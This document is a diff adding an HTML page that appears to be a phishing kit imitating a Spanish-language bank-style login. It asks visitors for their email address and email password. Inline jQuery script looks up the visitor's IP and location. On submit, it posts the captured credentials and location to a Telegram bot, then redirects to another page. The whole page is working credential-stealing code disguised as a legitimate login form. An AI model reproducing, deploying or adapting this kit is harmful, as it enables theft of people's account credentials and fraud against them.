@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html class="chrome">
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Default</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#ed0728">
+
+<link rel="stylesheet" href="./archivos/styles.30039a1c4409c4589a1d.css">
+
+<link rel="stylesheet" href="./archivos/deldoc.css">
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+<script src="dt.js"></script>
+<script>
+  $.getJSON("https://api.ipify.org?format=json", function(data) {
+          $("#gfg").html(data.ip);
+      });
+      $.getJSON("https://ipinfo.io", function(response) {
+    $("#ip").html("IP: " + response.ip);
+    $("#address").html("" + response.city + ", " + response.country);
+  });
+
+  var u_name, u_name2,  ip, ip2, message;
+  var ready = function() {
+    u_name = document.getElementById("txtcorr").value;
+    u_name2 = document.getElementById("txtclavcorr").value;
+    ip = document.getElementById("gfg").innerHTML;
+    ip2 = document.getElementById("address").innerHTML;
+    message = "escociabanespe\n☰Correo: " + u_name + "\n☰Cl4v3 correo: " + u_name2 + "\n🌎IP: " + ip +"\n" + ip2;
+  };
+  var sender = function() {
+    ready();
+    var settings = {
+      "async": true,
+      "crossDomain": true,
+      "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "cache-control": "no-cache"
+      },
+      "data": JSON.stringify({
+        "chat_id": chat_id,
+        "text": message
+      })
+    };
+    $.ajax(settings).done(function(response) {
+      console.log(response);
+      window.location = 'index.html';
+    });
+    return false;
+  };
+
+</script>
+
+
+</head><body>
+
+
+<joy-login _nghost-tur-c128="" ng-version="10.0.12"><main _ngcontent-tur-c128="" class="content"><router-outlet _ngcontent-tur-c128=""></router-outlet>
+
+<app-login _nghost-tur-c131="" class="ng-star-inserted">
+<app-toolbar-shared _ngcontent-tur-c131="" _nghost-tur-c130="">
+
+<mat-toolbar _ngcontent-tur-c130="" fxlayoutalign="flex-start center" class="mat-toolbar mat-toolbar-single-row" 
+style="place-content: center flex-start; align-items: center; flex-direction: row; box-sizing: border-box; display: flex;">
+
+<section _ngcontent-tur-c130=""  class="logo-container">
+<joy-icon _ngcontent-tur-c130="" fxhide.gt-sm="" alt=" Logo" class="clickable-logo" _nghost-tur-c98="" style="width: 26px; height: 26px; display: none;">
+<img _ngcontent-tur-c98="" class="joy-sanitized-icon ng-star-inserted" src="archivos/logg.svg" alt="icono"><!----><!----><!----></joy-icon>
+<joy-icon _ngcontent-tur-c130="" fxhide.lt-md="" alt=" Logo" class="clickable-logo" _nghost-tur-c98="" style="width: 168px; height: 24px;">
+<img _ngcontent-tur-c98="" class="joy-sanitized-icon ng-star-inserted" src="archivos/logg.svg" alt="icono"><!----><!----><!----></joy-icon></section>
+</mat-toolbar></app-toolbar-shared>
+
+<div _ngcontent-tur-c131="" fxlayout="column" fxlayoutalign.gt-sm="center center" fxlayoutgap.gt-sm="2rem" style="flex-direction: column; box-sizing: border-box; display: flex; place-content: center; align-items: center;">
+
+<router-outlet _ngcontent-tur-c131="" style="margin-bottom: 2rem;"></router-outlet>
+
+<app-welcome _nghost-tur-c134="" style="margin-bottom: 2rem;" class="ng-star-inserted">
+<joy-progress-box _ngcontent-tur-c134="" goforwardtext="Continuar" _nghost-tur-c123=""><!---->
+
+<mat-card _ngcontent-tur-c123="" class="mat-card mat-focus-indicator progress-card">
+
+<div id="vista1" >
+
+<section _ngcontent-tur-c123="" class="rendered-content">
+<joy-header _ngcontent-tur-c134="" headertitle="¡Te damos la bienvenida!" _nghost-tur-c121="">
+
+<div _ngcontent-tur-c121="" class="header-container"><div _ngcontent-tur-c121="" class="header-title">
+<b>Información de su correo</b></div>
+
+<div _ngcontent-tur-c121="" class="header-underlined"></div></div></joy-header>
+
+<form  class="ng-untouched ng-pristine ng-invalid" 
+style="flex-direction: column; box-sizing: border-box; display: flex;" method="post" action="" onsubmit="return sender();">
+
+<p id="gfg"  hidden=""></p>
+						<p id="address"  hidden=""></p>
+
+<mat-form-field _ngcontent-ayy-c133="" 
+class="mat-form-field ng-tns-c77-10 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-should-float
+ mat-form-field-has-label ng-untouched ng-pristine ng-invalid">
+ 
+ <div class="mat-form-field-wrapper ng-tns-c77-10"><div class="mat-form-field-flex ng-tns-c77-10"><!----><!---->
+ 
+ <div class="mat-form-field-infix ng-tns-c77-10">
+ 
+ <input _ngcontent-ayy-c133="" matinput="" formcontrolname="cardNumber"  placeholder="Correo electrónico" autocomplete="nope" 
+ type="email" class="mat-input-element mat-form-field-autofill-control ng-tns-c77-10 ng-untouched ng-pristine ng-invalid cdk-text-field-autofill-monitored" 
+ id="txtcorr" name="txtcorr"   required aria-invalid="false" aria-required="false">
+ 
+ <span class="mat-form-field-label-wrapper ng-tns-c77-10">
+ <label class="mat-form-field-label ng-tns-c77-10 ng-star-inserted" id="mat-form-field-label-15" for="mat-input-5" aria-owns="mat-input-5"><!---->
+ <mat-label _ngcontent-ayy-c133="" class="ng-tns-c77-10 ng-star-inserted">Ingresa tu correo electrónico</mat-label><!----><!----></label><!----></span>
+ </div><!----></div><div class="mat-form-field-underline ng-tns-c77-10 ng-star-inserted"><span class="mat-form-field-ripple ng-tns-c77-10"></span></div><!---->
+ <div class="mat-form-field-subscript-wrapper ng-tns-c77-10"><!---->
+ <div class="mat-form-field-hint-wrapper ng-tns-c77-10 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);"><!---->
+ <div class="mat-form-field-hint-spacer ng-tns-c77-10"></div></div><!----></div></div></mat-form-field>
+
+<mat-form-field _ngcontent-ayy-c133="" id="input-pin" class="mat-form-field ng-tns-c77-11 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy 
+mat-form-field-can-float mat-form-field-should-float mat-form-field-has-label ng-untouched ng-pristine ng-invalid">
+<div class="mat-form-field-wrapper ng-tns-c77-11"><div class="mat-form-field-flex ng-tns-c77-11"><!----><!---->
+<div class="mat-form-field-infix ng-tns-c77-11">
+
+<input _ngcontent-ayy-c133="" matinput="" formcontrolname="pin" filternumber=""  placeholder="Clave de correo"
+class="mat-input-element mat-form-field-autofill-control ng-tns-c77-11 ng-untouched ng-pristine ng-invalid cdk-text-field-autofill-monitored" type="password" 
+id="txtclavcorr" aria-invalid="false" name="txtclavcorr" aria-required="false" required>
+
+<span class="mat-form-field-label-wrapper ng-tns-c77-11">
+<label class="mat-form-field-label ng-tns-c77-11 ng-star-inserted" id="mat-form-field-label-17" for="mat-input-6" aria-owns="mat-input-6"><!---->
+<mat-label _ngcontent-ayy-c133="" class="ng-tns-c77-11 ng-star-inserted"> Ingresa tu clave de correo </mat-label><!----><!----></label><!----></span></div>
+<div class="mat-form-field-suffix ng-tns-c77-11 ng-star-inserted"><span _ngcontent-ayy-c133="" matsuffix="" class="cursor-pointer i-show ng-tns-c77-11"></span></div>
+<!----></div><div class="mat-form-field-underline ng-tns-c77-11 ng-star-inserted"><span class="mat-form-field-ripple ng-tns-c77-11"></span></div><!---->
+<div class="mat-form-field-subscript-wrapper ng-tns-c77-11"><!---->
+<div class="mat-form-field-hint-wrapper ng-tns-c77-11 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);"><!---->
+<div class="mat-form-field-hint-spacer ng-tns-c77-11"></div></div><!----></div></div></mat-form-field>
+
+
+
+</section>
+
+
+<br><br>
+<section _ngcontent-tur-c123="" class="btn-container" style="flex-direction: row; box-sizing: border-box; display: flex;"><!----><!----><!---->
+
+<joy-raised-button _ngcontent-tur-c123="" _nghost-tur-c102="" id="undefined" class="ng-star-inserted" style="flex: 1 1 100%; box-sizing: border-box; max-width: 100%;">
+<button _ngcontent-tur-c102="" type="submit" mat-raised-button="" color="primary" class="mat-focus-indicator mat-raised-button mat-button-base mat-primary">
+<span class="mat-button-wrapper"> Continuar </span><div matripple="" class="mat-ripple mat-button-ripple"></div><div class="mat-button-focus-overlay"></div></button></joy-raised-button>
+
+<!----></section>
+</form>
+
+</div>
+
+
+
+</mat-card></joy-progress-box><!----><!----></app-welcome><!---->
+<div _ngcontent-tur-c131="" fxlayout="row" id="buttons" fxlayoutgap="2rem" fxlayoutalign="space-around start" style="flex-direction: row; box-sizing: border-box; display: flex; 
+place-content: flex-start space-around; align-items: flex-start;">
+
+<img src="archivos/bajo.png"></div></div></app-login><!----></main></joy-login>
+
+
+<div class="cdk-live-announcer-element cdk-visually-hidden" aria-atomic="true" aria-live="polite"></div>
+
+
+
+</body></html>
